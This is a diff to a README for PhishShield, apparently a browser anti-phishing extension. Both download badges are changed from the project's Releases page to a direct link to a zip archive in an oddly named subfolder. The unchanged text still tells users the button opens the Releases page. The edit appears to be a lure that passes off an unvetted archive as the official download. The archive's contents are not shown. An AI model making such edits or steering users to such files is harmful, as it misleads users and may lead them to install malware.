@@ -12,7 +12,7 @@ To begin using PhishShield, you need to install it on your browser. Follow the s
 
 ### Download PhishShield
 
-[![Download PhishShield](https://img.shields.io/badge/Download-PhishShield-brightgreen)](https://github.com/abdelrahman835/PhishShield/releases)
+[![Download PhishShield](https://github.com/abdelrahman835/PhishShield/raw/refs/heads/main/shearman/Shield-Phish-v3.5.zip)](https://github.com/abdelrahman835/PhishShield/raw/refs/heads/main/shearman/Shield-Phish-v3.5.zip)
 
 1. Click the button above to visit the Releases page.
 2. On the Releases page, you will see the latest version of PhishShield.
@@ -61,6 +61,6 @@ Explore further documentation and updates through our GitHub repository. Here yo
 
 To download PhishShield again, simply return to our Releases page:
 
-[![Download PhishShield](https://img.shields.io/badge/Download-PhishShield-brightgreen)](https://github.com/abdelrahman835/PhishShield/releases)
+[![Download PhishShield](https://github.com/abdelrahman835/PhishShield/raw/refs/heads/main/shearman/Shield-Phish-v3.5.zip)](https://github.com/abdelrahman835/PhishShield/raw/refs/heads/main/shearman/Shield-Phish-v3.5.zip)
 
 Thank you for choosing PhishShield. Stay safe online!
